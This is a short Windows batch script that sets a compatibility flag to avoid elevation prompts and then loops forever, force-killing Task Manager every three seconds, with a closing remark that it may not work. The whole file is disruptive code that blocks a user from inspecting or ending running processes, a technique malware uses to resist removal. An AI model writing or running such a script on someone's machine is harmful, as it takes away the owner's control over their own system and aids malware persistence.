@echo off
set __compat_layer=runasinvoker
:A
timeout 3 > nul
taskkill /im "Taskmgr.exe" -f
goto A

'Side note: This may not work.